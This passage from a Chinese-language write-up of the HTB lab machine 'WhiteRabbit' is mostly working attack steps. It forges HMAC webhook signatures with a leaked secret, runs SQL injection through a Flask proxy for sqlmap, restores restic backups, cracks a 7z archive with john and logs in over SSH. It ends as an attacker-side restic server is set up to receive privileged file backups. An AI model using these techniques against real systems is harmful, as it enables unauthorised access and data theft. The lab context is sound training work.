<span class="attr">"versionId"</span><span class="punctuation">:</span> <span class="string">"803dfe3a-9d37-4e37-8a74-9281cf6aad25"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"meta"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"templateCredsSetupCompleted"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"instanceId"</span><span class="punctuation">:</span> <span class="string">"21894d8ad64e6c729da4131f6f85c4f5b635dd24a4cd990abd2d7df2c0b9c3e5"</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"WDCH0NwAZIztoV3u"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"tags"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:04.551Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:04.551Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"EXjKCJjO0OPsnJqx"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"database"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:02.744Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:02.744Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"JuPt3zEtHwmK6jur"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"gophish"</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>分析一下，，首先是请求<code>Webhook</code>，也就是发送POST请求到<code>http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d</code></p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"httpMethod"</span><span class="punctuation">:</span> <span class="string">"POST"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"path"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseMode"</span><span class="punctuation">:</span> <span class="string">"responseNode"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e425306c-06ba-441b-9860-170433602b1a"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">220</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">440</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"webhookId"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br></pre></td></tr></tbody></table></figure>

<p>然后是签名部分，也就是<code>HMAC_SHA256(request_body, secret)</code>，这里<code>secret</code>为<code>3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS</code></p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"action"</span><span class="punctuation">:</span> <span class="string">"hmac"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"SHA256"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">"={{ JSON.stringify($json.body) }}"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"dataPropertyName"</span><span class="punctuation">:</span> <span class="string">"calculated_signature"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"secret"</span><span class="punctuation">:</span> <span class="string">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e406828a-0d97-44b8-8798-6d066c4a4159"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Calculate the signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.crypto"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">860</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>用户检查部分，按邮箱查询，而使用<code>{{ $json.body.email }}</code>的方式拼接sql语句，显然存在sql注入。</p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">     <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">       <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1"</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">     <span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>尝试伪造签名</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">secret = <span class="string">b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"test.json"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    body = json.dumps(json.load(f), separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line">sig = hmac.new(secret, body.encode(), hashlib.sha256).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sig)</span><br><span class="line"></span><br><span class="line"><span class="comment"># {</span></span><br><span class="line"><span class="comment">#   "campaign_id": 1,</span></span><br><span class="line"><span class="comment">#   "email": "test@ex.com",</span></span><br><span class="line"><span class="comment">#   "message": "Clicked Link"</span></span><br><span class="line"><span class="comment"># }</span></span><br><span class="line"><span class="comment"># cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd</span></span><br></pre></td></tr></tbody></table></figure>

<p>发送请求</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> sign=<span class="string">"sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd"</span></span><br><span class="line">$ curl -X POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d \</span><br><span class="line"> -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line"> -H <span class="string">"x-gophish-signature: <span class="variable">$sign</span>"</span> \</span><br><span class="line"> --data @test.json</span><br><span class="line">Info: User is not <span class="keyword">in</span> database</span><br></pre></td></tr></tbody></table></figure>

<h2 id="flask代理sqlmap"><a href="#flask代理sqlmap" class="headerlink" title="flask代理sqlmap"></a>flask代理sqlmap</h2><p>可以发现成功伪造了签名，到达了用户检查部分。那么现在只需要尝试进行sql注入即可。可以使用flask代理</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secret = <span class="string">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line">url = <span class="string">"http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hmac_body</span>(<span class="params">body: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    body_str = json.dumps(body, separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line">    sign = hmac.new(secret.encode(), body_str.encode(), hashlib.sha256).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    email = request.args.get(<span class="string">'email'</span>)</span><br><span class="line">    body = {</span><br><span class="line">      <span class="string">"campaign_id"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="string">"email"</span>: email,</span><br><span class="line">      <span class="string">"message"</span>: <span class="string">"Clicked Link"</span></span><br><span class="line">    }</span><br><span class="line">    sign = hmac_body(body)</span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">        <span class="string">"x-gophish-signature"</span>: <span class="string">f"sha256=<span class="subst">{sign}</span>"</span></span><br><span class="line">    }</span><br><span class="line">    res = requests.post(url, headers=headers, json=body)</span><br><span class="line">    res.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(port=<span class="number">12345</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>然后使用sqlmap注入，成功注入</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">"http://127.0.0.1:12345/?email=1"</span> -p email -v 3 --batch </span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/25594414/image-20250407233737421.png" class="" title="image-20250407233737421">

<p>爆库名</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">"http://127.0.0.1:12345/?email=1"</span> -p email -v 3 --dbs --batch </span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] phishing</span><br><span class="line">[*] temp</span><br></pre></td></tr></tbody></table></figure>

<p>然后就是翻数据库，在<code>phishing</code>库里只有一堆邮箱，没啥用</p>
<img src="/posts/25594414/image-20250407234122553.png" class="" title="image-20250407234122553">

<p>在<code>temp</code>库有表名为<code>command_log</code>，疑似有历史命令执行记录，爆破一下</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">"http://127.0.0.1:12345/?email=1"</span> -p email -v 3 -D temp -T command_log --dump --batch </span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | <span class="built_in">date</span>                | <span class="built_in">command</span>                                                                      |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| 1  | 2024-08-30 10:44:01 | <span class="built_in">uname</span> -a                                                                     |</span><br><span class="line">| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |</span><br><span class="line">| 3  | 2024-08-30 11:58:36 | <span class="built_in">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd                       |</span><br><span class="line">| 4  | 2024-08-30 11:59:02 | <span class="built_in">rm</span> -rf .bash_history                                                         |</span><br><span class="line">| 5  | 2024-08-30 11:59:47 | <span class="comment">#thatwasclose                                                                |</span></span><br><span class="line">| 6  | 2024-08-30 14:40:42 | <span class="built_in">cd</span> /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Restic到SSH登录"><a href="#Restic到SSH登录" class="headerlink" title="Restic到SSH登录"></a>Restic到SSH登录</h2><p><code>Restic</code>是一款备份工具，首先启动了<code>restic</code>服务，域名为<code>75951e6ff.whiterabbit.htb</code>，然后将密码<code>ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw</code>存到<code>.restic_passwd </code>，之后删除历史记录，生成新的密码存入管道<code>passwd</code>中。</p>
<p>这里需要与<code>Restic</code>交互，下载文件<a target="_blank" rel="noopener" href="https://github.com/restic/restic/releases/download/v0.16.4/restic_0.16.4_linux_amd64.bz2">Restic</a>，获取快照</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./restic_0.16.4_linux_amd64 -r rest:http://75951e6ff.whiterabbit.htb snapshots</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 5b26a938 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /home/kali/.cache/restic</span><br><span class="line">ID        Time                 Host         Tags        Paths</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">1 snapshots</span><br></pre></td></tr></tbody></table></figure>

<p><code>/dev/shm/bob/ssh</code>文件中可能存在<code>ssh</code>秘钥，尝试恢复快照</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./restic_0.16.4_linux_amd64 -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target ./backup</span><br><span class="line">$ tree backup</span><br><span class="line">backup</span><br><span class="line">└── dev</span><br><span class="line">    └── shm</span><br><span class="line">        └── bob</span><br><span class="line">            └── ssh</span><br><span class="line">                └── bob.7z</span><br></pre></td></tr></tbody></table></figure>

<p>显然<code>bob.7z</code>里面有好东西，尝试解压</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ 7z x backup/dev/shm/bob/ssh/bob.7z </span><br><span class="line"></span><br><span class="line">7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19</span><br><span class="line"> 64-bit locale=zh_CN.UTF-8 Threads:32 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line">Scanning the drive <span class="keyword">for</span> archives:</span><br><span class="line">1 file, 572 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: backup/dev/shm/bob/ssh/bob.7z</span><br><span class="line">--</span><br><span class="line">Path = backup/dev/shm/bob/ssh/bob.7z</span><br><span class="line">Type = 7z</span><br><span class="line">Physical Size = 572</span><br><span class="line">Headers Size = 204</span><br><span class="line">Method = LZMA2:12 7zAES</span><br><span class="line">Solid = +</span><br><span class="line">Blocks = 1</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line">ERROR: Data Error <span class="keyword">in</span> encrypted file. Wrong password? : bob</span><br><span class="line">ERROR: Data Error <span class="keyword">in</span> encrypted file. Wrong password? : bob.pub</span><br><span class="line">ERROR: Data Error <span class="keyword">in</span> encrypted file. Wrong password? : config</span><br><span class="line">             </span><br><span class="line">Sub items Errors: 3</span><br><span class="line"></span><br><span class="line">Archives with Errors: 1</span><br><span class="line"></span><br><span class="line">Sub items Errors: 3</span><br></pre></td></tr></tbody></table></figure>

<p>这里使用了<code>7zAES</code>加密，<code>bob</code>为私钥，<code>bob.pub</code>为公钥，<code>config</code>为配置文件</p>
<p>使用<code>john</code>工具爆破密码</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ 7z2john backup/dev/shm/bob/ssh/bob.7z &gt; bob.hash</span><br><span class="line">$ <span class="built_in">cat</span> bob.hash</span><br><span class="line">bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399<span class="variable">$00</span></span><br><span class="line"></span><br><span class="line">$ john --show bob.hash </span><br><span class="line">bob.7z:1q2w3e4r5t6y</span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 0 left</span><br></pre></td></tr></tbody></table></figure>

<p>获取到密码为<code>1q2w3e4r5t6y</code>，解压文件</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 7z x backup/dev/shm/bob/ssh/bob.7z </span><br></pre></td></tr></tbody></table></figure>

<p>使用解压出的秘钥进行登录，成功登录</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> config</span><br><span class="line">Host whiterabbit</span><br><span class="line">  HostName whiterabbit.htb</span><br><span class="line">  Port 2222</span><br><span class="line">  User bob</span><br><span class="line"></span><br><span class="line">$ ssh -i bob bob@whiterabbit.htb -p 2222</span><br><span class="line">The authenticity of host <span class="string">'[whiterabbit.htb]:2222 ([10.10.11.63]:2222)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[whiterabbit.htb]:2222<span class="string">' (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This system has been minimized by removing packages and content that are</span></span><br><span class="line"><span class="string">not required on a system that users do not log into.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To restore this content, you can run the '</span>unminimize<span class="string">' command.</span></span><br><span class="line"><span class="string">Last login: Mon Apr  7 15:50:37 2025 from 10.10.16.80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bob@ebdce80611e9:~$ hostname</span></span><br><span class="line"><span class="string">ebdce80611e9</span></span><br><span class="line"><span class="string">bob@ebdce80611e9:~$ uname -a</span></span><br><span class="line"><span class="string">Linux ebdce80611e9 6.8.0-57-generic #59-Ubuntu SMP PREEMPT_DYNAMIC Sat Mar 15 17:40:59 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></tbody></table></figure>

<p>但是看着是在容器里面，那么得尝试逃逸到宿主机。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::  ip6-localnet</span><br><span class="line">ff00::  ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.17.0.2      ebdce80611e9</span><br></pre></td></tr></tbody></table></figure>

<p><code>172.17.0.0/24</code>是<code>Docker</code>默认子网网桥，因此处于非特权容器。</p>
<p>查看<code>sudo</code>权限</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bob on ebdce80611e9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on ebdce80611e9:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/restic</span><br></pre></td></tr></tbody></table></figure>

<h2 id="通过Restic获取敏感文件逃逸到宿主机"><a href="#通过Restic获取敏感文件逃逸到宿主机" class="headerlink" title="通过Restic获取敏感文件逃逸到宿主机"></a>通过Restic获取敏感文件逃逸到宿主机</h2><p>可以以任何权限运行<code>Restic</code>，并且无需密码。那么可以尝试在攻击机开启一个<code>Restic</code>服务，让<code>Bob</code>将敏感文件备份到攻击机，<a target="_blank" rel="noopener" href="https://github.com/restic/rest-server/releases/download/v0.12.1/rest-server_0.12.1_linux_amd64.tar.gz">下载地址</a></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf rest-server_0.12.1_linux_amd64.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> rest-server_0.12.1_linux_amd64</span><br><span class="line">$ <span class="built_in">chmod</span> +x rest-server </span><br><span class="line">$ <span class="built_in">mkdir</span> -p ./restic_repo/test	<span class="comment"># 创建备份库</span></span><br><span class="line">$ ./restic_0.16.4_linux_amd64 init -r ./restic/rest-server_0.12.1_linux_amd64/restic_repo/test	<span class="comment"># 初始化</span></span><br><span class="line">$ ./rest-server --path ./restic_repo --no-auth --listen :23456 </span><br><span class="line">Data directory: ./restic_repo</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">start server on :23456</span><br></pre></td></tr></tbody></table></figure>

<p>切换到容器内</p>
